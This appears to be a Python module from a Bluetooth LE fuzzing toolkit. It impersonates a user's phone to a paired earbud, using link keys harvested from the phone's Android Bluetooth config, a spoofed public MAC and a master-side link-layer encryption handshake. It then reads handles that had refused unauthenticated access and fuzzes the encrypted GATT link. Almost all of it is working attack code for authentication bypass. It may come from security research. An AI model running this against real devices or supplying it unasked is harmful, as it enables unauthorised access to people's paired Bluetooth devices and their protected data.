#!/usr/bin/env python3
# att-fuzz/roles/impersonation_fuzz.py
"""
模式三驱动:加密冒充 -- 用已收割的 bond 密钥伪装手机(central)直连耳机,
绕过 GATT 0x05 句柄墙(攻击面⑦)。

与 central_fuzz 的区别:连上后主动走 LL_ENC 握手(master 侧),启用 host 侧
AES-CCM,在加密链路上做 GATT 发现/读写。前提:已从手机 bt_config.conf 收割
到耳机侧 LTK(bond keys),且知道手机的 public MAC(冒充其地址)。

LL_ENC 握手序列(BT spec Vol 6 Part B 5.3.3,master=我们):
  1. 我们发 LL_ENC_REQ(明文,opcode 0x03):Rand(8)+EDIV(2)+SKDm(8)+IVm(4),
     全部空口小端序(同 pcap_decrypt 解析序)。
  2. 从机回 LL_ENC_RSP(明文,0x04):SKDs(8)+IVs(4)。
  3. 从机发 LL_START_ENC_REQ(明文,0x05) -- 注意是 slave 发,不是我们发。
  4. 我们 enable_encryption(LTK, SKDm, SKDs, IVm, IVs)。
  5. 我们发 LL_START_ENC_RSP(密文,0x06,我们的 TX counter=0)。
  6. 从机回 LL_START_ENC_RSP(密文,0x06,slave TX counter=0)。
  7. 此后双向所有 data+control PDU 均加密。

设计边界:不调用 cmd_reset(板子复位由主 agent 管)。握手失败抛 ImpersonationError
带清晰上下文。duration=0 一直跑到 Ctrl-C。
"""

import json
import logging
import os
import time
from pathlib import Path
from struct import pack

from sniffle.pcap import PcapBleWriter
from sniffle.sniffle_hw import SniffleHW

from core import bt_crypto, bt_keys
from core.att import AttOpcode, read_req
from core.serial_lock import guard as serial_guard
from core.transport import (LinkDrop, SniffleTransport, TransportError,
                            LL_ENC_REQ, LL_ENC_RSP, LL_START_ENC_REQ,
                            LL_START_ENC_RSP)

log = logging.getLogger("att-fuzz.impersonation")

REPO = Path(__file__).resolve().parents[2]

# 握手等待超时(秒):ENC_RSP/START_ENC_REQ/START_ENC_RSP 各等这么久
HANDSHAKE_TIMEOUT = 5.0


class ImpersonationError(Exception):
    """冒充握手失败(带上下文,便于主 agent 排障)。"""


def make_transport(serport, target: dict, outdir: Path) -> SniffleTransport:
    hw = SniffleHW(serport=serport or target.get("serport"))
    pcap = PcapBleWriter(str(outdir / "capture.pcap"))
    return SniffleTransport(hw, pcap=pcap, jsonl_path=outdir / "transport.jsonl",
                            conn_interval_units=target.get("conn_interval", 12))


def run(target: dict, outdir: Path, serport=None,
        bt_keys_path: str | None = None, keys_mac: str | None = None,
        phone_mac: str | None = None, duration: float = 0.0,
        max_cases: int = 0, adb_serial: str | None = None,
        strategy_paths=None, seed: int = 1, rounds: int = 0,
        round_budget: int = 100, wall_ledger=None,
        on_transport=None, ledger=None) -> int:
    """加密冒充主入口。duration>0 为运行秒数上限;0 表示一直跑到 Ctrl-C。
    bt_keys_path:Android bt_config.conf 或提取 JSON。
    keys_mac:bt_config 里目标设备(耳机)MAC(书写序)。
    phone_mac:手机 public MAC(书写序) -- 我们冒充这个地址。
    strategy_paths:认证面语料(策略目录/文件);None=不跑语料循环(只做墙验证读)。
    wall_ledger:阶段一台账路径(Path/str),供 0x05 墙 handle 加载;None=跳过墙验证。
    on_transport:transport 创建后回调(GUI 事件桥用);None=不回调(CLI 不传)。
    ledger:外部 ObservableLedger(GUI 实时刷新用);None=角色自建 Ledger。
    返回 0=正常结束,非 0=出错。"""
    outdir = Path(outdir)
    outdir.mkdir(parents=True, exist_ok=True)
    with serial_guard(serport or target.get("serport"), "CLI impersonation(加密冒充)"):
        return _run_locked(target, outdir, serport, bt_keys_path, keys_mac,
                           phone_mac, duration, max_cases, adb_serial,
                           strategy_paths, seed, rounds, round_budget,
                           wall_ledger, on_transport, ledger)


def _run_locked(target, outdir, serport, bt_keys_path, keys_mac,
                phone_mac, duration, max_cases, adb_serial,
                strategy_paths, seed, rounds, round_budget,
                wall_ledger, on_transport=None, ledger=None) -> int:
    transport = make_transport(serport, target, outdir)
    if on_transport is not None:
        on_transport(transport)
    ledger_path = outdir / "impersonation_ledger.jsonl"
    started = time.time()
    conn_no = 0

    def record(**fields):
        rec = {"ts": round(time.time(), 6), "conn": conn_no}
        rec.update(fields)
        with open(ledger_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec, ensure_ascii=False) + "\n")

    # ---- 1. 加载 bond 密钥 ----
    # 优先级：bt_keys 文件 > target JSON ltk 字段
    if bt_keys_path:
        bonds = bt_keys.load_keys(bt_keys.resolve_path(bt_keys_path),
                                  target_mac=keys_mac)
        if not bonds:
            raise ImpersonationError("密钥文件里没有可用 bond(目标节未匹配?试试 --keys-mac)")
        bond = next((b for b in bonds if b.ltk), None)
        if bond is None:
            raise ImpersonationError("bond 无 LTK(LE_KEY_PENC 缺失)")
        ltk_wire = bond.ltk   # dump 序;enable_encryption 内部反转
        log.info("bond: %s ltk=%s rand=%s ediv=%s",
                 bond.name or bond.section, ltk_wire.hex(),
                 bond.rand.hex() if bond.rand else "?",
                 bond.ediv.hex() if bond.ediv else "?")
        record(kind="bond_loaded", name=bond.name, section=bond.section,
               ltk=ltk_wire.hex(), key_size=bond.key_size)
    elif target.get("ltk"):
        ltk_wire = bytes.fromhex(target["ltk"])
        log.info("using inline LTK from target JSON: %s...", ltk_wire.hex()[:16])
        record(kind="bond_loaded", name="target.json", ltk=ltk_wire.hex(),
               key_size=16)
    else:
        raise ImpersonationError("需要 bt_keys 文件或 target JSON ltk 字段")

    # ---- 2. 设我们的地址 = 手机 public MAC(冒充) ----
    if not phone_mac:
        raise ImpersonationError("需要 --phone-mac 指定手机地址(书写序)以冒充")
    phone_wire, _ = transport._parse_mac(phone_mac)
    log.info("impersonating phone MAC %s (wire %s)", phone_mac, phone_wire.hex())
    record(kind="setaddr", phone_mac=phone_mac, wire=phone_wire.hex())

    try:
        while True:
            if duration and time.time() - started >= duration:
                log.info("duration reached, stopping")
                break
            conn_no += 1
            log.info("=== impersonation connection #%d ===", conn_no)
            record(kind="conn_start", conn=conn_no)
            try:
                _do_one_connection(transport, target, ltk_wire, outdir,
                                   phone_wire, record, duration, started,
                                   strategy_paths, seed, max_cases, rounds,
                                   round_budget, wall_ledger, ledger)
            except LinkDrop as drop:
                log.warning("link dropped: %s", drop)
                record(kind="link_drop", source=drop.source,
                       reason=drop.reason)
            except ImpersonationError as e:
                log.error("impersonation failed: %s", e)
                record(kind="impersonation_error", error=str(e))
                # 握手失败:不重试(密钥/地址可能不对,需要人工排查)
                return 1
            except TransportError as e:
                log.error("transport error: %s", e)
                record(kind="transport_error", error=str(e))
                stuck = getattr(e, "stuck", False)
                if stuck:
                    log.error("firmware may be stuck -- needs cmd_reset (main agent)")
                    return 2
                # 干净失败:重试下一次连接
                continue
    except KeyboardInterrupt:
        log.info("interrupted by user")
    finally:
        log.info("impersonation run summary: %d connection attempts", conn_no)
        log.info("ledger: %s", ledger_path)
        log.info("pcap:   %s", outdir / "capture.pcap")
    return 0


def _do_one_connection(transport, target, ltk_wire, outdir, phone_wire,
                        record, duration, started,
                        strategy_paths, seed, max_cases, rounds,
                        round_budget, wall_ledger, ext_ledger=None):
    """单次冒充连接:握手+发现(_handshake_and_setup)-> 加密 GATT(墙验证+语料)。"""
    gatt = _handshake_and_setup(transport, target, ltk_wire, phone_wire, record,
                               outdir=outdir)
    if gatt is None:
        return

    _do_encrypted_gatt(transport, target, outdir, record, duration, started,
                       gatt, strategy_paths, seed, max_cases, rounds,
                       round_budget, wall_ledger, ltk_wire, phone_wire,
                       ext_ledger)

    # 正常断链
    if transport.link_up:
        try:
            transport.disconnect()
        except Exception as e:
            log.warning("disconnect failed: %s", e)


def _handshake_and_setup(transport, target, ltk_wire, phone_wire, record,
                        outdir=None):
    """connect -> DLE/MTU -> LL ENC 握手 -> peer client burst 应答 -> GATT 发现。
    成功返回 GattMap;失败(连接/握手出错)返回 None(由调用方决定后续)。"""
    from core.gatt_map import discover

    # ---- 3. 发起连接(冒充手机地址) ----
    log.info("connecting to target %s as %s ...", target.get("mac", "?"),
             phone_wire.hex())
    try:
        transport.connect(target, our_addr=phone_wire, our_addr_random=False)
    except (LinkDrop, TransportError) as e:
        log.warning("connect failed: %s", e)
        record(kind="connect_failed", error=str(e))
        return None
    log.info("connected: aa=%08X", transport.aa or 0)
    record(kind="connected", aa="%08X" % (transport.aa or 0))

    # ---- 4. DLE + MTU(明文阶段,握手前先协商好)----
    transport.setup_data_size()
    log.info("negotiated: ll_max=%d att_mtu=%d", transport.ll_max,
             transport.att_mtu)
    record(kind="data_size", ll_max=transport.ll_max,
           att_mtu=transport.att_mtu)

    # ---- 5. 驱动 LL ENC 握手 ----
    try:
        _drive_enc_handshake(transport, ltk_wire, record)
    except ImpersonationError as e:
        log.error("handshake failed: %s", e)
        record(kind="handshake_failed", error=str(e))
        return None
    log.info("encryption engaged -- link is now encrypted")
    record(kind="enc_engaged")

    # ---- 6. peer client burst 应答 + server 发现 ----
    _handle_peer_client_burst(transport, record)
    log.info("encrypted GATT discovery ...")
    gatt = discover(transport)
    gatt_path = outdir / "gatt_enc.json" if outdir else None
    if gatt_path:
        try:
            gatt.save(gatt_path)
        except Exception as e:
            log.warning("gatt map save failed: %s", e)
    log.info("GATT: %d services, %d characteristics",
             len(gatt.services), len(gatt.characteristics))
    record(kind="gatt_discovered", services=len(gatt.services),
           chars=len(gatt.characteristics))
    for s in gatt.services:
        log.info("  service %s [%04X-%04X]", s.uuid, s.start_handle, s.end_handle)
        record(kind="gatt_service", uuid=s.uuid,
               start=s.start_handle, end=s.end_handle)
    return gatt


def _reconnect_encrypted(transport, target, ltk_wire, phone_wire, record):
    """ATT_FREEZE/LinkDrop 后重连:断 -> 连 -> DLE/MTU -> 握手 -> burst。
    不重发现(GATT 地图不变,复用调用方持有的 gatt);重连次数由调用方闭包
    计数器限流(每次 _do_encrypted_gatt 调用重置)。
    返回 True=重连成功(新加密会话就绪),False=失败。"""
    try:
        if transport.link_up:
            try:
                transport.disconnect()
            except Exception as e:
                log.warning("disconnect before reconnect failed: %s", e)
        log.info("reconnecting (impersonation) as %s ...", phone_wire.hex())
        transport.connect(target, our_addr=phone_wire, our_addr_random=False)
        transport.setup_data_size()
        _drive_enc_handshake(transport, ltk_wire, record)
        _handle_peer_client_burst(transport, record)
        log.info("reconnect ok -- encrypted link re-established")
        return True
    except (LinkDrop, TransportError, ImpersonationError) as e:
        log.warning("reconnect failed: %s", e)
        return False


def _drive_enc_handshake(transport, ltk_wire, record):
    """驱动 LL_ENC 握手(master 侧)。成功后 transport._enc_enabled=True。"""
    import os as _os
    # a. 生成 SKDm(8 随机)+ IVm(4 随机);Rand=0/EDIV=0 匹配 bond
    skdm_wire = _os.urandom(8)
    ivm_wire = _os.urandom(4)
    rand = b"\x00" * 8
    ediv = b"\x00\x00"
    # b. LL_ENC_REQ: opcode + Rand(8) + EDIV(2) + SKDm(8, wire/LE) + IVm(4)
    enc_req = bytes([LL_ENC_REQ]) + rand + ediv + skdm_wire + ivm_wire
    log.info("sending LL_ENC_REQ (skdm=%s ivm=%s)",
             skdm_wire.hex(), ivm_wire.hex())
    record(kind="enc_req_sent", skdm=skdm_wire.hex(), ivm=ivm_wire.hex())
    transport._tx_ll_pdu(3, enc_req)   # 明文(握手前 _enc_enabled=False)

    # c. 等 LL_ENC_RSP(明文,0x04):从 _enc_handshake_q 取
    rsp = _wait_handshake_pdu(transport, LL_ENC_RSP, HANDSHAKE_TIMEOUT)
    if rsp is None:
        raise ImpersonationError("LL_ENC_RSP 超时(从机未回加密握手响应)"
                                 "-- 可能密钥/bond 不匹配或从机不支持加密重连")
    _, enc_rsp_payload = rsp
    if len(enc_rsp_payload) < 13:
        raise ImpersonationError("LL_ENC_RSP 长度不足: %d" % len(enc_rsp_payload))
    skds_wire = enc_rsp_payload[1:9]
    ivs_wire = enc_rsp_payload[9:13]
    log.info("got LL_ENC_RSP (skds=%s ivs=%s)",
             skds_wire.hex(), ivs_wire.hex())
    record(kind="enc_rsp_recv", skds=skds_wire.hex(), ivs=ivs_wire.hex())

    # d. 等 LL_START_ENC_REQ(明文,0x05) -- 从机发送
    start_req = _wait_handshake_pdu(transport, LL_START_ENC_REQ,
                                    HANDSHAKE_TIMEOUT)
    if start_req is None:
        # 有些实现可能跳过 START_ENC_REQ 直接进加密 -- 尝试不报错,
        # 但记录警告(BT spec 要求从机发,实测个别栈可能省略)
        log.warning("未收到 LL_START_ENC_REQ(从机可能省略,按 spec 应发)"
                    " -- 继续 enable_encryption")
        record(kind="start_enc_req_missing")
    else:
        log.info("got LL_START_ENC_REQ (plaintext, slave ready)")
        record(kind="start_enc_req_recv")

    # e. enable_encryption(LTK 反转 + SKD/IV 空口序)
    transport.enable_encryption(ltk_wire, skdm_wire, skds_wire,
                                ivm_wire, ivs_wire)

    # f. 发 LL_START_ENC_RSP(密文,0x06,我们的 TX counter=0)
    log.info("sending LL_START_ENC_RSP (encrypted, our c0)")
    record(kind="start_enc_rsp_sent")
    transport._tx_ll_pdu(3, bytes([LL_START_ENC_RSP]))   # _enc_enabled -> 加密

    # g. 等从机 LL_START_ENC_RSP(密文,0x06) -- recv 路径解密后入队列
    start_rsp = _wait_handshake_pdu(transport, LL_START_ENC_RSP,
                                    HANDSHAKE_TIMEOUT)
    if start_rsp is None:
        raise ImpersonationError("从机 LL_START_ENC_RSP 超时(加密未完成)"
                                 "-- 可能 MIC 校验失败(密钥/字节序错?)")
    log.info("got LL_START_ENC_RSP (encrypted, slave c0) -- encryption engaged")
    record(kind="start_enc_rsp_recv")


def _wait_handshake_pdu(transport, opcode, timeout):
    """从 _enc_handshake_q 取指定 opcode 的 PDU;poll 期间泵串口。
    返回 (opcode, payload) 或 None(超时)。"""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        # 先查队列(可能 _feed_rx_data 已在 _pump 里入队)
        for i, (opc, payload) in enumerate(transport._enc_handshake_q):
            if opc == opcode:
                transport._enc_handshake_q.pop(i)
                return (opc, payload)
        # 泵串口(可能触发 _handle_ll_control 入队)
        try:
            transport.recv_att(timeout=0.1)
        except LinkDrop:
            return None
    # 最后再查一次队列
    for i, (opc, payload) in enumerate(transport._enc_handshake_q):
        if opc == opcode:
            transport._enc_handshake_q.pop(i)
            return (opc, payload)
    return None


def _do_encrypted_gatt(transport, target, outdir, record, duration, started,
                       gatt, strategy_paths, seed, max_cases, rounds,
                       round_budget, wall_ledger, ltk_wire, phone_wire,
                       ext_ledger=None):
    """加密链路上:0x05 墙验证读 + 认证面语料循环。
    gatt:已在 _handshake_and_setup 发现的加密 GATT 地图(复用,不重发现)。
    wall_ledger:阶段一台账路径(Path/str/None);None=跳过 0x05 墙验证。
    零设备特定常量(handle 全部来自台账或发现,无写死)。"""
    # ---- 0x05 墙验证:读原 0x05 拒绝的 handle,对照现响应 ----
    # 通用:从阶段一台账 grep 出原 0x05 拒绝的 handle 集(无写死 handle)。
    # wall_ledger=None 时跳过墙验证(无阶段一台账,直接进语料循环)。
    if wall_ledger is not None:
        wall_ledger_path = Path(wall_ledger)
        wall_handles = _load_0x05_handles(wall_ledger_path)
        log.info("0x05 wall handles from stage-1 ledger: %d (%s)",
                 len(wall_handles),
                 ",".join("0x%04X" % h for h in wall_handles[:12]) +
                 (" ..." if len(wall_handles) > 12 else ""))
        record(kind="wall_handles_loaded", count=len(wall_handles),
               source=str(wall_ledger_path))

        # 也读发现的特征(前几个可读的),与 0x05 handle 并行对照
        discover_handles = [ch.value_handle for ch in gatt.characteristics[:5]
                            if ch.props & 0x02]
        read_handles = (wall_handles[:8] + discover_handles)[:12]
        read_count = 0
        for handle in read_handles:
            if duration and time.time() - started >= duration:
                break
            log.info("encrypted read handle 0x%04X ...", handle)
            try:
                transport.inject(read_req(handle))
                rsp = transport.recv_att(timeout=transport.response_timeout)
            except LinkDrop as e:
                log.warning("read handle 0x%04X -> link drop: %s", handle, e)
                record(kind="read_drop", handle=handle, error=str(e))
                break
            if rsp is None:
                log.warning("read handle 0x%04X -> no response", handle)
                record(kind="read_timeout", handle=handle)
            else:
                op = rsp.pdu[0]
                err = rsp.pdu[1] if op == 0x01 and len(rsp.pdu) >= 5 else None
                tag = "0x05(wall persists!)" if err == 0x05 else \
                      ("err=0x%02X" % err if err is not None else "OK")
                log.info("read handle 0x%04X -> op=0x%02X %s", handle, op, tag)
                record(kind="read_ok", handle=handle, op=op,
                       error_code=err, pdu=rsp.pdu.hex()[:64])
                read_count += 1
        log.info("encrypted reads done: %d ok", read_count)
        record(kind="reads_done", count=read_count)
    else:
        log.info("no wall ledger, skipping 0x05 validation")
        record(kind="wall_validation_skipped")

    # ---- 4. 认证面语料循环 ----
    # FuzzSession 复用已加密 transport(negotiate_mtu=False,MTU 已在明文段协商)。
    # gatt 地图直接注入,跳过重发现。no_mtu_negotiate_meta=False:加密链路不再
    # 断链重协,保持当前协商态。ATT_FREEZE/LinkDrop 走加密重连回调。
    if not strategy_paths:
        log.info("no strategy paths -- skipping corpus loop")
        return
    from core.session import FuzzSession
    from core.fuzz_loop import run_corpus_loop
    from core.monitor import Ledger

    fuzz_ledger = ext_ledger if ext_ledger is not None else \
        Ledger(str(outdir / "fuzz_ledger.jsonl"))
    fuzz_session = FuzzSession(transport, target, gatt_map_path=None,
                               ledger=fuzz_ledger,
                               negotiate_mtu=False)
    fuzz_session.gatt = gatt   # 已发现的加密 GATT 地图,跳过重发现

    # 重连计数器(闭包 mutable):每次 _do_encrypted_gatt 调用重置
    reconnect_count = [0]

    def _on_freeze(_s):
        reconnect_count[0] += 1
        if reconnect_count[0] > 3:
            log.warning("freeze reconnect limit reached")
            return False
        ok = _reconnect_encrypted(transport, target, ltk_wire, phone_wire, record)
        if ok:
            fuzz_session.gatt = gatt   # 重连不重发现,复用同一地图
        return ok

    def _on_link_drop():
        reconnect_count[0] += 1
        if reconnect_count[0] > 3:
            log.warning("link-drop reconnect limit reached")
            return False
        ok = _reconnect_encrypted(transport, target, ltk_wire, phone_wire, record)
        if ok:
            fuzz_session.gatt = gatt
        return ok

    stats = run_corpus_loop(fuzz_session, strategy_paths, fuzz_ledger,
                            gatt, transport, seed=seed, max_cases=max_cases,
                            rounds=rounds, round_budget=round_budget,
                            on_freeze=_on_freeze, on_link_drop=_on_link_drop,
                            no_mtu_negotiate_meta=False)
    record(kind="corpus_done", **stats)


# ---- 双角色 GATT 处理(跟进轮) ----
# 通用 mini GATT server 响应器:peer 作为 client 先发 WRITE_REQ/L2CAP signaling,
# 我们应答后再做 server 发现。零设备特定常量(无写死 handle/opcode/MAC)。

# L2CAP LE signaling 请求码 -> 响应码(规范 req/rsp 配对)
_L2CAP_SIG_REQ_RSP = {0x01: None, 0x12: 0x13, 0x14: 0x15, 0x17: 0x18}
# 0x01=Command Reject(本身就是 rsp);0x12=Conn Param Update Req->0x13 Rsp;
# 0x14=LE Credit Based Conn Req->0x15 Rsp;0x17=同 0x14 的扩展(双向)。
# indication 类(无响应):0x16 LE Flow Control Credit Ind。
_L2CAP_SIG_INDICATIONS = {0x16}


def _handle_peer_client_burst(transport, record, burst_timeout=3.0,
                              max_pdus=40):
    """握手后先听 peer 的 client 请求 burst,通用应答,直到安静 N 秒或上限。
    兼容纯 server 设备:若 peer 不发任何 client 请求,直接返回(转入发现)。
    返回应答的 PDU 数。"""
    from struct import pack
    deadline = time.monotonic() + burst_timeout
    count = 0
    idle = 0
    while count < max_pdus and time.monotonic() < deadline:
        # 先查非 ATT(L2CAP signaling / SMP),再查 ATT;两者都空则短超时泵
        na = transport.recv_non_att(timeout=0.15)
        if na is not None:
            cid, sdu = na
            _respond_l2cap(transport, cid, sdu)
            count += 1
            deadline = time.monotonic() + 1.5   # 活动则续命
            idle = 0
            continue
        att = transport.recv_att(timeout=0.15)
        if att is not None:
            _respond_att(transport, att.pdu)
            count += 1
            deadline = time.monotonic() + 1.5
            idle = 0
            continue
        idle += 1
        if idle >= 4:   # ~0.6s 无 incoming -> burst 结束
            break
    log.info("peer client burst handled: %d PDUs answered", count)
    record(kind="peer_burst_handled", count=count)
    return count


def _respond_att(transport, pdu: bytes):
    """通用 ATT 响应(无写死 handle)。WRITE_REQ->WRITE_RSP;READ_REQ->READ_RSP 空;
    INDICATE->CONFIRM;WRITE_CMD/NOTIFY 无响应;未知忽略。"""
    if not pdu:
        return
    op = pdu[0]
    if op == AttOpcode.WRITE_REQ:            # 0x12 -> 0x13
        transport.inject(bytes([AttOpcode.WRITE_RSP]))
        log.debug("peer WRITE_REQ (handle 0x%02X%02X) -> WRITE_RSP",
                  pdu[2], pdu[1])
    elif op == AttOpcode.READ_REQ:           # 0x0A -> 0x0B 空
        transport.inject(bytes([AttOpcode.READ_RSP]))
    elif op == AttOpcode.HANDLE_VALUE_IND:   # 0x1D -> 0x1E
        transport.inject(bytes([AttOpcode.HANDLE_VALUE_CNF]))
    # WRITE_CMD(0x52)/NOTIFY(0x1B)/其他:无响应
    elif op == AttOpcode.WRITE_CMD or op == AttOpcode.HANDLE_VALUE_NTF:
        log.debug("peer %s (no response needed)", AttOpcode(op).name)


def _respond_l2cap(transport, cid: int, sdu: bytes):
    """通用 L2CAP 响应。CID 0x0005(LE signaling):req 码回配对 rsp;indication 无响应;
    未知码回 Command Reject(0x01,command not understood)。SMP(CID 6)不在此处应答
    (配对由上层/角色驱动,不通用代答)。"""
    if cid != 0x0005 or len(sdu) < 4:
        return
    code, ident = sdu[0], sdu[1]
    data = sdu[4:]
    if code in _L2CAP_SIG_INDICATIONS:
        log.debug("peer L2CAP signaling ind code=0x%02X (no response)", code)
        return
    rsp_code = _L2CAP_SIG_REQ_RSP.get(code)
    if rsp_code is not None:
        rsp = bytes([rsp_code, ident]) + pack("<H", len(data)) + data
    else:
        # 未知 req 码 -> Command Reject(0x01,"command not understood"=0x0000)
        reject_data = pack("<H", 0x0000)
        rsp = bytes([0x01, ident]) + pack("<H", len(reject_data)) + reject_data
    # L2CAP 帧:len + cid(5) + signaling
    l2 = pack("<HH", len(rsp), 0x0005) + rsp
    transport.inject_raw([(2, l2)])
    log.debug("peer L2CAP signaling code=0x%02X -> rsp code=0x%02X", code,
              rsp[0])


def _load_0x05_handles(ledger_path: Path) -> list:
    """从阶段一台账里 grep 出原 0x05(Insufficient Authentication)拒绝的 handle 集。
    通用:遍历 ledger.jsonl,收 error_code==0x05 的 handle,去重排序。"""
    handles = set()
    if not ledger_path.is_file():
        return []
    with ledger_path.open("r", encoding="utf-8") as fh:
        for line in fh:
            try:
                rec = json.loads(line)
            except json.JSONDecodeError:
                continue
            if rec.get("error_code") == 0x05 and rec.get("handle") is not None:
                handles.add(int(rec["handle"]))
    return sorted(handles)
